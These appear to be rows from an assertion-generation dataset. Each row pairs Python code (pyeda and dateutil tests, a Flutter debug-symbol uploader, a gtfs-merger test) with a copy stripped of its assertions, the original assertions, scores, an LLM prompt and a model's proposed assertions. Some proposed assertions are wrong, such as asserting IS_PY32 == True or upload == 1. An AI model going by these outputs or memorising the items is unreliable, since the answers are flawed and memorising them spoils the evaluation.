['Xor(1', '==', 'True'], ['Xor(1', '==', 'True'], ['Xor(1', '==', 'True'], ['Xor(a', '==', 'True'], ['Xor(1', '==', 'True'], ['Xor(~a', '==', 'True'], ['str(Xor(a', '==', 'True'], ['str(Xor(1', '==', 'True'], ['str(Xor(~a', '==', 'True'], ['Equal()', '==', 'One'], ['Equal(a)', '==', 'One'], ['Equal(0', '==', 'True'], ['Equal(0', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(0', '==', 'True'], ['Equal(0', '==', 'True'], ['Equal(0', '==', 'True'], ['Equal(0', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(a', '==', 'True'], ['Equal(1', '==', 'True'], ['Equal(~a', '==', 'True'], ['str(Equal(a', '==', 'True'], ['str(Equal(1', '==', 'True'], ['str(Equal(~a', '==', 'True'], ['Implies(0', '==', 'True'], ['Implies(0', '==', 'True'], ['Implies(1', '==', 'True'], ['Implies(1', '==', 'True'], ['Implies(a', '==', 'True'], ['Implies(1', '==', 'True'], ['Implies(~a', '==', 'True'], ['str(Implies(a', '==', 'True'], ['str(Implies(1', '==', 'True'], ['str(Implies(~a', '==', 'True'], ['ITE(0', '==', 'True'], ['ITE(0', '==', 'True'], ['ITE(0', '==', 'True'], ['ITE(0', '==', 'True'], ['ITE(1', '==', 'True'], ['ITE(1', '==', 'True'], ['ITE(1', '==', 'True'], ['ITE(1', '==', 'True'], ['Zero.is_zero()', '==', 'True'], ['One.is_zero()', '==', 'False'], ['a.is_zero()', '==', 'False'], ['(~a', '|', 'b).is_zero()'], ['One.is_one()', '==', 'True'], ['Zero.is_one()', '==', 'False'], ['a.is_one()', '==', 'False'], ['(~a', '|', 'b).is_one()'], ['Expression.box(a)', '==', 'a'], ['Expression.box(0)', '==', 'Zero'], ['Expression.box(1)', '==', 'One'], [""Expression.box('0')"", '==', 'Zero'], [""Expression.box('1')"", '==', 'One'], ['Expression.box([])', '==', 'Zero'], ['Expression.box(42)', '==', 'One']]",166,151,0.9096385542168676,0.0192700357325165,"['a', 'b', 'c', 'd', 'e', 'p', 'q', 's', 'w', 'x', 'y', 'z', 'd1', 'd0', 'xs', 'ys', 'f']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['a', 'b', 'c', 'd', 'e', 'p', 'q', 's', 'w', 'x', 'y', 'z', 'd1', 'd0', 'xs', 'ys', 'f']
*Code:

1""""""
2Test expression Boolean functions
3
4NOTE: This was from some miscellaneous work a while ago.
5      Needs to be reorganized.
6""""""
7
8
9from pyeda.boolalg import boolfunc
10from pyeda.boolalg import exprnode
11from pyeda.boolalg.bfarray import exprvars
12from pyeda.boolalg.expr import (
13    Zero, One,
14    exprvar, expr,
15    #expr2dimacscnf, expr2dimacssat,
16    Expression,
17    Not, Or, And, Xor, Equal, Implies, ITE,
18    Nor, Nand, Xnor, Unequal,
19    OneHot0, OneHot, Majority, AchillesHeel, Mux,
20)
21
22
23# Common variables
24a, b, c, d, e, p, q, s, w, x, y, z = map(exprvar, 'abcdepqswxyz')
25d1, d0 = map(exprvar, ('d1', 'd0'))
26
27xs = exprvars('x', 16)
28ys = exprvars('y', 16, 16, 16)
29
30
31def test_exprnode_constants():
32    """"""Test exprnode constants""""""
33
34
35
36
37
38def test_exprnode_errors():
39    """"""Test exprnode errors.""""""
40
41
42def test_expr():
43    f = a & ~b | c ^ ~d
44
45
46
47
48
49
50
51
52def test_to_ast():
53    """"""Test exprnode.to_ast().""""""
54    f = (~a | b & ~c ^ d).eq(~(0 & p) >> (~q ^ 1))
55        ('eq',
56            ('or',
57                ('lit', -a.uniqid),
58                ('xor',
59                    ('and', ('lit', b.uniqid),
60                            ('lit', -c.uniqid)),
61                    ('lit', d.uniqid))),
62            ('impl',
63                ('not',
64                    ('and',
65                        ('lit', p.uniqid),
66                        ('const', 0))),
67                ('xor',
68                    ('lit', -q.uniqid),
69                    ('const', 1))))
70
71
72def test_not():
73
74
75
76
77def test_or():
78
79
80
81
82
83
84def test_and():
85
86
87
88
89
90
91def test_xor():
92
93
94
95
96
97
98def test_equal():
99
100
101
102
103
104
105def test_implies():
106
107
108
109
110def test_ite():
111
112
113def test_is_zero_one():
114
115
116
117def test_box():
118
119
120
121
122",3372,"[[24, 'a', '!=', None, ""variables used must be initialized and not None""],
 [24, 'b', '!=', None, ""variables used must be initialized and not None""],
 [24, 'c', '!=', None, ""variables used must be initialized and not None""],
 [24, 'd', '!=', None, ""variables used must be initialized and not None""],
 [24, 'e', '!=', None, ""variables used must be initialized and not None""],
 [24, 'p', '!=', None, ""variables used must be initialized and not None""],
 [24, 'q', '!=', None, ""variables used must be initialized and not None""],
 [24, 's', '!=', None, ""variables used must be initialized and not None""],
 [24, 'w', '!=', None, ""variables used must be initialized and not None""],
 [24, 'x', '!=', None, ""variables used must be initialized and not None""],
 [24, 'y', '!=', None, ""variables used must be initialized and not None""],
 [24, 'z', '!=', None, ""variables used must be initialized and not None""],
 [25, 'd1', '!=', None, ""variables used must be initialized and not None""],
 [25, 'd0', '!=', None, ""variables used must be initialized and not None""],
 [27, 'xs', '!=', None, ""variable 'xs' must be initialized and not None""],
 [28, 'ys', '!=', None, ""variable 'ys' must be initialized and not None""],
 [44, 'f', '!=', None, ""the result of the operation must not be None""], 
 [55, 'f', '!=', None, ""the result of the operation must not be None""]]"
MediaBrowser/plugin.video.emby,"# -*- coding: utf-8 -*-
""""""
Tests for implementation details, not necessarily part of the user-facing
API.

The motivating case for these tests is #483, where we want to smoke-test
code that may be difficult to reach through the standard API calls.
""""""

import unittest
import sys

import pytest

from dateutil.parser._parser import _ymd
from dateutil import tz

IS_PY32 = sys.version_info[0:2] == (3, 2)


class TestYMD(unittest.TestCase):

    # @pytest.mark.smoke
    def test_could_be_day(self):
        ymd = _ymd('foo bar 124 baz')

        ymd.append(2, 'M')
        assert ymd.has_month
        assert not ymd.has_year
        assert ymd.could_be_day(4)
        assert not ymd.could_be_day(-6)
        assert not ymd.could_be_day(32)

        # Assumes leapyear
        assert ymd.could_be_day(29)

        ymd.append(1999)
        assert ymd.has_year
        assert not ymd.could_be_day(29)

        ymd.append(16, 'D')
        assert ymd.has_day
        assert not ymd.could_be_day(1)

        ymd = _ymd('foo bar 124 baz')
        ymd.append(1999)
        assert ymd.could_be_day(31)


###
# Test that private interfaces in _parser are deprecated properly
@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
def test_parser_private_warns():
    from dateutil.parser import _timelex, _tzparser
    from dateutil.parser import _parsetz

    with pytest.warns(DeprecationWarning):
        _tzparser()

    with pytest.warns(DeprecationWarning):
        _timelex('2014-03-03')

    with pytest.warns(DeprecationWarning):
        _parsetz('+05:00')


@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
def test_parser_parser_private_not_warns():
    from dateutil.parser._parser import _timelex, _tzparser
    from dateutil.parser._parser import _parsetz

    with pytest.warns(None) as recorder:
        _tzparser()
        assert len(recorder) == 0

    with pytest.warns(None) as recorder:
        _timelex('2014-03-03')

        assert len(recorder) == 0

    with pytest.warns(None) as recorder:
        _parsetz('+05:00')
        assert len(recorder) == 0


@pytest.mark.tzstr
def test_tzstr_internal_timedeltas():
    with pytest.warns(tz.DeprecatedTzFormatWarning):
        tz1 = tz.tzstr(""EST5EDT,5,4,0,7200,11,-3,0,7200"")

    with pytest.warns(tz.DeprecatedTzFormatWarning):
        tz2 = tz.tzstr(""EST5EDT,4,1,0,7200,10,-1,0,7200"")

    assert tz1._start_delta != tz2._start_delta
    assert tz1._end_delta != tz2._end_delta
","
1# -*- coding: utf-8 -*-
2""""""
3Tests for implementation details, not necessarily part of the user-facing
4API.
5
6The motivating case for these tests is #483, where we want to smoke-test
7code that may be difficult to reach through the standard API calls.
8""""""
9
10import unittest
11import sys
12
13import pytest
14
15from dateutil.parser._parser import _ymd
16from dateutil import tz
17
18IS_PY32 = sys.version_info[0:2] == (3, 2)
19
20
21class TestYMD(unittest.TestCase):
22
23    # @pytest.mark.smoke
24    def test_could_be_day(self):
25        ymd = _ymd('foo bar 124 baz')
26
27        ymd.append(2, 'M')
28
29        # Assumes leapyear
30
31        ymd.append(1999)
32
33        ymd.append(16, 'D')
34
35        ymd = _ymd('foo bar 124 baz')
36        ymd.append(1999)
37
38
39###
40# Test that private interfaces in _parser are deprecated properly
41@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
42def test_parser_private_warns():
43    from dateutil.parser import _timelex, _tzparser
44    from dateutil.parser import _parsetz
45
46    with pytest.warns(DeprecationWarning):
47        _tzparser()
48
49    with pytest.warns(DeprecationWarning):
50        _timelex('2014-03-03')
51
52    with pytest.warns(DeprecationWarning):
53        _parsetz('+05:00')
54
55
56@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
57def test_parser_parser_private_not_warns():
58    from dateutil.parser._parser import _timelex, _tzparser
59    from dateutil.parser._parser import _parsetz
60
61    with pytest.warns(None) as recorder:
62        _tzparser()
63
64    with pytest.warns(None) as recorder:
65        _timelex('2014-03-03')
66
67
68    with pytest.warns(None) as recorder:
69        _parsetz('+05:00')
70
71
72@pytest.mark.tzstr
73def test_tzstr_internal_timedeltas():
74    with pytest.warns(tz.DeprecatedTzFormatWarning):
75        tz1 = tz.tzstr(""EST5EDT,5,4,0,7200,11,-3,0,7200"")
76
77    with pytest.warns(tz.DeprecatedTzFormatWarning):
78        tz2 = tz.tzstr(""EST5EDT,4,1,0,7200,10,-1,0,7200"")
79
80","[['ymd.has_month', '==', 'True'], ['ymd.has_year', '==', 'False'], ['ymd.could_be_day(4)', '==', 'True'], ['ymd.could_be_day(-6)', '==', 'False'], ['ymd.could_be_day(32)', '==', 'False'], ['ymd.could_be_day(29)', '==', 'True'], ['ymd.has_year', '==', 'True'], ['ymd.could_be_day(29)', '==', 'False'], ['ymd.has_day', '==', 'True'], ['ymd.could_be_day(1)', '==', 'False'], ['ymd.could_be_day(31)', '==', 'True'], ['len(recorder)', '==', '0'], ['len(recorder)', '==', '0'], ['len(recorder)', '==', '0'], ['tz1._start_delta', '!=', 'tz2._start_delta'], ['tz1._end_delta', '!=', 'tz2._end_delta']]",16,16,1.0,0.0064,"['IS_PY32', 'ymd', 'tz1', 'tz2']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['IS_PY32', 'ymd', 'tz1', 'tz2']
*Code:

1# -*- coding: utf-8 -*-
2""""""
3Tests for implementation details, not necessarily part of the user-facing
4API.
5
6The motivating case for these tests is #483, where we want to smoke-test
7code that may be difficult to reach through the standard API calls.
8""""""
9
10import unittest
11import sys
12
13import pytest
14
15from dateutil.parser._parser import _ymd
16from dateutil import tz
17
18IS_PY32 = sys.version_info[0:2] == (3, 2)
19
20
21class TestYMD(unittest.TestCase):
22
23    # @pytest.mark.smoke
24    def test_could_be_day(self):
25        ymd = _ymd('foo bar 124 baz')
26
27        ymd.append(2, 'M')
28
29        # Assumes leapyear
30
31        ymd.append(1999)
32
33        ymd.append(16, 'D')
34
35        ymd = _ymd('foo bar 124 baz')
36        ymd.append(1999)
37
38
39###
40# Test that private interfaces in _parser are deprecated properly
41@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
42def test_parser_private_warns():
43    from dateutil.parser import _timelex, _tzparser
44    from dateutil.parser import _parsetz
45
46    with pytest.warns(DeprecationWarning):
47        _tzparser()
48
49    with pytest.warns(DeprecationWarning):
50        _timelex('2014-03-03')
51
52    with pytest.warns(DeprecationWarning):
53        _parsetz('+05:00')
54
55
56@pytest.mark.skipif(IS_PY32, reason='pytest.warns not supported on Python 3.2')
57def test_parser_parser_private_not_warns():
58    from dateutil.parser._parser import _timelex, _tzparser
59    from dateutil.parser._parser import _parsetz
60
61    with pytest.warns(None) as recorder:
62        _tzparser()
63
64    with pytest.warns(None) as recorder:
65        _timelex('2014-03-03')
66
67
68    with pytest.warns(None) as recorder:
69        _parsetz('+05:00')
70
71
72@pytest.mark.tzstr
73def test_tzstr_internal_timedeltas():
74    with pytest.warns(tz.DeprecatedTzFormatWarning):
75        tz1 = tz.tzstr(""EST5EDT,5,4,0,7200,11,-3,0,7200"")
76
77    with pytest.warns(tz.DeprecatedTzFormatWarning):
78        tz2 = tz.tzstr(""EST5EDT,4,1,0,7200,10,-1,0,7200"")
79
80",3488,"[[18, 'IS_PY32', '==', True, 'Expected boolean outcome from python version comparison'],
 [25, 'ymd', '!=', None, 'Instance of _ymd must be not None after being assigned'],
 [37, 'ymd', '!=', None, 'Instance of _ymd must be not None after being assigned'],
 [76, 'tz1', '!=', None, 'Instance of tzstr must be not None after being assigned'],
 [78, 'tz2', '!=', None, 'Instance of tzstr must be not None after being assigned']]"
mikejurka/engine,"#!/usr/bin/env python
#
# Copyright 2013 The Flutter Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
"""""" Merges the debug symbols and uploads them to cipd.
""""""

import argparse
import collections
import json
import os
import platform
import shutil
import subprocess
import sys
import tarfile


def IsLinux():
  return platform.system() == 'Linux'


def GetPackagingDir(out_dir):
  return os.path.abspath(os.path.join(out_dir, os.pardir))


def CreateCIPDDefinition(target_arch, out_dir):
  dir_name = os.path.basename(os.path.normpath(out_dir))
  return """"""
package: flutter/fuchsia-debug-symbols-%s
description: Flutter and Dart runner debug symbols for Fuchsia. Target architecture %s.
install_mode: copy
data:
  - dir: %s
"""""" % (target_arch, target_arch, dir_name)


# CIPD CLI needs the definition and data directory to be relative to each other.
def WriteCIPDDefinition(target_arch, out_dir):
  _packaging_dir = GetPackagingDir(out_dir)
  yaml_file = os.path.join(_packaging_dir, 'debug_symbols.cipd.yaml')
  with open(yaml_file, 'w') as f:
    cipd_def = CreateCIPDDefinition(target_arch, out_dir)
    f.write(cipd_def)
  return yaml_file


def ProcessCIPDPackage(upload, cipd_yaml, engine_version, out_dir, target_arch):
  _packaging_dir = GetPackagingDir(out_dir)
  if upload and IsLinux():
    command = [
        'cipd', 'create', '-pkg-def', cipd_yaml, '-ref', 'latest', '-tag',
        'git_revision:%s' % engine_version
    ]
  else:
    command = [
        'cipd', 'pkg-build', '-pkg-def', cipd_yaml, '-out',
        os.path.join(_packaging_dir,
                     'fuchsia-debug-symbols-%s.cipd' % target_arch)
    ]

  # Retry up to three times.  We've seen CIPD fail on verification in some
  # instances. Normally verification takes slightly more than 1 minute when
  # it succeeds.
  num_tries = 3
  for tries in range(num_tries):
    try:
      subprocess.check_call(command, cwd=_packaging_dir)
      break
    except subprocess.CalledProcessError:
      print('Failed %s times' % tries + 1)
      if tries == num_tries - 1:
        raise

def CreateTarFile(folder_path, base_dir):
  archive_name = os.path.basename(folder_path)
  tar_file_path = os.path.join(base_dir, archive_name + '.tar.bz2')
  with tarfile.open(tar_file_path, ""w:bz2"") as archive:
    for root, dirs, _ in os.walk(folder_path):
      for dir_name in dirs:
        dir_path = os.path.join(root, dir_name)
        archive.add(dir_path, arcname=dir_name)
  return tar_file_path


def main():
  parser = argparse.ArgumentParser()

  parser.add_argument(
      '--symbol-dirs',
      required=True,
      nargs='+',
      help='Space separated list of directories that contain the debug symbols.'
  )
  parser.add_argument(
      '--out-dir',
      required=True,
      action='store',
      dest='out_dir',
      help='Output directory where the executables will be placed.')
  parser.add_argument(
      '--target-arch', type=str, choices=['x64', 'arm64'], required=True)
  parser.add_argument(
      '--engine-version',
      required=True,
      help='Specifies the flutter engine SHA.')

  parser.add_argument('--upload', default=False, action='store_true')

  args = parser.parse_args()

  symbol_dirs = args.symbol_dirs
  for symbol_dir in symbol_dirs:
    assert os.path.exists(symbol_dir) and os.path.isdir(symbol_dir)

  arch = args.target_arch
  out_dir = os.path.join(args.out_dir,
                         'flutter-fuchsia-debug-symbols-%s' % arch)
  if os.path.exists(out_dir):
    print 'Directory: %s is not empty, deleting it.' % out_dir
    shutil.rmtree(out_dir)
  os.makedirs(out_dir)

  for symbol_dir in symbol_dirs:
    archive_path = CreateTarFile(symbol_dir, out_dir)
    print('Created archive: ' + archive_path)

  cipd_def = WriteCIPDDefinition(arch, out_dir)
  ProcessCIPDPackage(args.upload, cipd_def, args.engine_version, out_dir, arch)
  return 0


if __name__ == '__main__':
  sys.exit(main())
","
1#!/usr/bin/env python
2#
3# Copyright 2013 The Flutter Authors. All rights reserved.
4# Use of this source code is governed by a BSD-style license that can be
5# found in the LICENSE file.
6"""""" Merges the debug symbols and uploads them to cipd.
7""""""
8
9import argparse
10import collections
11import json
12import os
13import platform
14import shutil
15import subprocess
16import sys
17import tarfile
18
19
20def IsLinux():
21  return platform.system() == 'Linux'
22
23
24def GetPackagingDir(out_dir):
25  return os.path.abspath(os.path.join(out_dir, os.pardir))
26
27
28def CreateCIPDDefinition(target_arch, out_dir):
29  dir_name = os.path.basename(os.path.normpath(out_dir))
30  return """"""
31package: flutter/fuchsia-debug-symbols-%s
32description: Flutter and Dart runner debug symbols for Fuchsia. Target architecture %s.
33install_mode: copy
34data:
35  - dir: %s
36"""""" % (target_arch, target_arch, dir_name)
37
38
39# CIPD CLI needs the definition and data directory to be relative to each other.
40def WriteCIPDDefinition(target_arch, out_dir):
41  _packaging_dir = GetPackagingDir(out_dir)
42  yaml_file = os.path.join(_packaging_dir, 'debug_symbols.cipd.yaml')
43  with open(yaml_file, 'w') as f:
44    cipd_def = CreateCIPDDefinition(target_arch, out_dir)
45    f.write(cipd_def)
46  return yaml_file
47
48
49def ProcessCIPDPackage(upload, cipd_yaml, engine_version, out_dir, target_arch):
50  _packaging_dir = GetPackagingDir(out_dir)
51  if upload and IsLinux():
52    command = [
53        'cipd', 'create', '-pkg-def', cipd_yaml, '-ref', 'latest', '-tag',
54        'git_revision:%s' % engine_version
55    ]
56  else:
57    command = [
58        'cipd', 'pkg-build', '-pkg-def', cipd_yaml, '-out',
59        os.path.join(_packaging_dir,
60                     'fuchsia-debug-symbols-%s.cipd' % target_arch)
61    ]
62
63  # Retry up to three times.  We've seen CIPD fail on verification in some
64  # instances. Normally verification takes slightly more than 1 minute when
65  # it succeeds.
66  num_tries = 3
67  for tries in range(num_tries):
68    try:
69      subprocess.check_call(command, cwd=_packaging_dir)
70      break
71    except subprocess.CalledProcessError:
72      print('Failed %s times' % tries + 1)
73      if tries == num_tries - 1:
74        raise
75
76def CreateTarFile(folder_path, base_dir):
77  archive_name = os.path.basename(folder_path)
78  tar_file_path = os.path.join(base_dir, archive_name + '.tar.bz2')
79  with tarfile.open(tar_file_path, ""w:bz2"") as archive:
80    for root, dirs, _ in os.walk(folder_path):
81      for dir_name in dirs:
82        dir_path = os.path.join(root, dir_name)
83        archive.add(dir_path, arcname=dir_name)
84  return tar_file_path
85
86
87def main():
88  parser = argparse.ArgumentParser()
89
90  parser.add_argument(
91      '--symbol-dirs',
92      required=True,
93      nargs='+',
94      help='Space separated list of directories that contain the debug symbols.'
95  )
96  parser.add_argument(
97      '--out-dir',
98      required=True,
99      action='store',
100      dest='out_dir',
101      help='Output directory where the executables will be placed.')
102  parser.add_argument(
103      '--target-arch', type=str, choices=['x64', 'arm64'], required=True)
104  parser.add_argument(
105      '--engine-version',
106      required=True,
107      help='Specifies the flutter engine SHA.')
108
109  parser.add_argument('--upload', default=False, action='store_true')
110
111  args = parser.parse_args()
112
113  symbol_dirs = args.symbol_dirs
114  for symbol_dir in symbol_dirs:
115
116  arch = args.target_arch
117  out_dir = os.path.join(args.out_dir,
118                         'flutter-fuchsia-debug-symbols-%s' % arch)
119  if os.path.exists(out_dir):
120    print 'Directory: %s is not empty, deleting it.' % out_dir
121    shutil.rmtree(out_dir)
122  os.makedirs(out_dir)
123
124  for symbol_dir in symbol_dirs:
125    archive_path = CreateTarFile(symbol_dir, out_dir)
126    print('Created archive: ' + archive_path)
127
128  cipd_def = WriteCIPDDefinition(arch, out_dir)
129  ProcessCIPDPackage(args.upload, cipd_def, args.engine_version, out_dir, arch)
130  return 0
131
132
133if __name__ == '__main__':
134  sys.exit(main())
135","[['os.path.exists(symbol_dir)', '==', 'True'], ['os.path.isdir(symbol_dir)', '==', 'True']]",1,2,2.0,0.0004998750312421,"['out_dir', 'target_arch', 'dir_name', '_packaging_dir', 'yaml_file', 'upload', 'cipd_yaml', 'engine_version', 'command', 'num_tries', 'folder_path', 'base_dir', 'archive_name', 'tar_file_path', 'dir_path', 'parser', 'args', 'symbol_dirs', 'arch', 'archive_path']",20,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['out_dir', 'target_arch', 'dir_name', '_packaging_dir', 'yaml_file', 'upload', 'cipd_yaml', 'engine_version', 'command', 'num_tries', 'folder_path', 'base_dir', 'archive_name', 'tar_file_path', 'dir_path', 'parser', 'args', 'symbol_dirs', 'arch', 'archive_path']
*Code:

1#!/usr/bin/env python
2#
3# Copyright 2013 The Flutter Authors. All rights reserved.
4# Use of this source code is governed by a BSD-style license that can be
5# found in the LICENSE file.
6"""""" Merges the debug symbols and uploads them to cipd.
7""""""
8
9import argparse
10import collections
11import json
12import os
13import platform
14import shutil
15import subprocess
16import sys
17import tarfile
18
19
20def IsLinux():
21  return platform.system() == 'Linux'
22
23
24def GetPackagingDir(out_dir):
25  return os.path.abspath(os.path.join(out_dir, os.pardir))
26
27
28def CreateCIPDDefinition(target_arch, out_dir):
29  dir_name = os.path.basename(os.path.normpath(out_dir))
30  return """"""
31package: flutter/fuchsia-debug-symbols-%s
32description: Flutter and Dart runner debug symbols for Fuchsia. Target architecture %s.
33install_mode: copy
34data:
35  - dir: %s
36"""""" % (target_arch, target_arch, dir_name)
37
38
39# CIPD CLI needs the definition and data directory to be relative to each other.
40def WriteCIPDDefinition(target_arch, out_dir):
41  _packaging_dir = GetPackagingDir(out_dir)
42  yaml_file = os.path.join(_packaging_dir, 'debug_symbols.cipd.yaml')
43  with open(yaml_file, 'w') as f:
44    cipd_def = CreateCIPDDefinition(target_arch, out_dir)
45    f.write(cipd_def)
46  return yaml_file
47
48
49def ProcessCIPDPackage(upload, cipd_yaml, engine_version, out_dir, target_arch):
50  _packaging_dir = GetPackagingDir(out_dir)
51  if upload and IsLinux():
52    command = [
53        'cipd', 'create', '-pkg-def', cipd_yaml, '-ref', 'latest', '-tag',
54        'git_revision:%s' % engine_version
55    ]
56  else:
57    command = [
58        'cipd', 'pkg-build', '-pkg-def', cipd_yaml, '-out',
59        os.path.join(_packaging_dir,
60                     'fuchsia-debug-symbols-%s.cipd' % target_arch)
61    ]
62
63  # Retry up to three times.  We've seen CIPD fail on verification in some
64  # instances. Normally verification takes slightly more than 1 minute when
65  # it succeeds.
66  num_tries = 3
67  for tries in range(num_tries):
68    try:
69      subprocess.check_call(command, cwd=_packaging_dir)
70      break
71    except subprocess.CalledProcessError:
72      print('Failed %s times' % tries + 1)
73      if tries == num_tries - 1:
74        raise
75
76def CreateTarFile(folder_path, base_dir):
77  archive_name = os.path.basename(folder_path)
78  tar_file_path = os.path.join(base_dir, archive_name + '.tar.bz2')
79  with tarfile.open(tar_file_path, ""w:bz2"") as archive:
80    for root, dirs, _ in os.walk(folder_path):
81      for dir_name in dirs:
82        dir_path = os.path.join(root, dir_name)
83        archive.add(dir_path, arcname=dir_name)
84  return tar_file_path
85
86
87def main():
88  parser = argparse.ArgumentParser()
89
90  parser.add_argument(
91      '--symbol-dirs',
92      required=True,
93      nargs='+',
94      help='Space separated list of directories that contain the debug symbols.'
95  )
96  parser.add_argument(
97      '--out-dir',
98      required=True,
99      action='store',
100      dest='out_dir',
101      help='Output directory where the executables will be placed.')
102  parser.add_argument(
103      '--target-arch', type=str, choices=['x64', 'arm64'], required=True)
104  parser.add_argument(
105      '--engine-version',
106      required=True,
107      help='Specifies the flutter engine SHA.')
108
109  parser.add_argument('--upload', default=False, action='store_true')
110
111  args = parser.parse_args()
112
113  symbol_dirs = args.symbol_dirs
114  for symbol_dir in symbol_dirs:
115
116  arch = args.target_arch
117  out_dir = os.path.join(args.out_dir,
118                         'flutter-fuchsia-debug-symbols-%s' % arch)
119  if os.path.exists(out_dir):
120    print 'Directory: %s is not empty, deleting it.' % out_dir
121    shutil.rmtree(out_dir)
122  os.makedirs(out_dir)
123
124  for symbol_dir in symbol_dirs:
125    archive_path = CreateTarFile(symbol_dir, out_dir)
126    print('Created archive: ' + archive_path)
127
128  cipd_def = WriteCIPDDefinition(arch, out_dir)
129  ProcessCIPDPackage(args.upload, cipd_def, args.engine_version, out_dir, arch)
130  return 0
131
132
133if __name__ == '__main__':
134  sys.exit(main())
135",5874,"[24, 'out_dir', !=, None, 'out_dir should not be None'],
[38, 'target_arch', !=, None, 'target_arch should not be None'],
[38, 'out_dir', !=, None, 'out_dir should not be None'],
[48, 'upload', ==, 1, 'Upload should be a boolean'],
[48, 'cipd_yaml', !=, None, 'cipd_yaml should not be None'],
[48, 'engine_version', !=, None, 'engine_version should not be None'],
[48, 'out_dir', !=, None, 'out_dir should not be None'],
[48, 'target_arch', !=, None, 'target_arch should not be None'],
[75, 'folder_path', !=, None, 'folder_path should not be None'],
[75, 'base_dir', !=, None, 'base_dir should not be None'],
[87, 'parser', !=, None, 'parser should not be None'],
[111, 'args', !=, None, 'args should not be None'],
[125, 'symbol_dirs', !=, None, 'symbol_dirs should not be None'],
[125, 'arch', !=, None, 'arch should not be None'],
[125, 'out_dir', !=, None, 'out_dir should not be None'],
[128, 'args.upload', ==, 1, 'args.upload should be a Boolean'],
[128, 'cipd_def', !=, None, 'cipd_def should not be None'],
[128, 'args.engine_version', !=, None, 'args.engine_version should not be None'],
[128, 'out_dir', !=, None, 'out_dir should not be None'],
[128, 'arch', !=, None, 'arch should not be None']"
door2door-io/gtfs-merger,"from gtfsmerger import GTFSMerger
import pandas as pd
from pandas.util import testing as tm
import numpy as np
import pytest


def test_gtfs_merger(gtfs_merger):
    assert gtfs_merger.merged['stops'].iloc[:5]['stop_id'].tolist() == [
        u'0-n1502-1',
        u'0-n62046-1',
        u'0-n1520-1',
        u'0-n1522-1',
        u'0-n1510']

    assert gtfs_merger.merged['stops'].iloc[:4]['parent_station'].tolist() == [
        '0-n1502', '0-n62046', '0-n1520', '0-n1522']

    assert pd.isnull(gtfs_merger.merged['stops'].iloc[5][
        'parent_station'])

    z_p = gtfs_merger.get_zipfile()

    assert gtfs_merger.merged['calendar_dates'][
        'date'].dtype == np.dtype('<M8[ns]')

    assert set(z_p.namelist()) == set([
        'agency.txt',
        'stop_times.txt',
        'stops.txt',
        'shapes.txt',
        'calendar_dates.txt',
        'routes.txt',
        'trips.txt'])


def test_gtfs_merger_from_bytes(gtfs_merger_from_bytes):
    assert gtfs_merger_from_bytes.merged[
        'stops'].iloc[:5]['stop_id'].tolist() == [
            u'0-n1502-1',
            u'0-n62046-1',
            u'0-n1520-1',
            u'0-n1522-1',
            u'0-n1510']

    assert gtfs_merger_from_bytes.merged['stops'].iloc[:4][
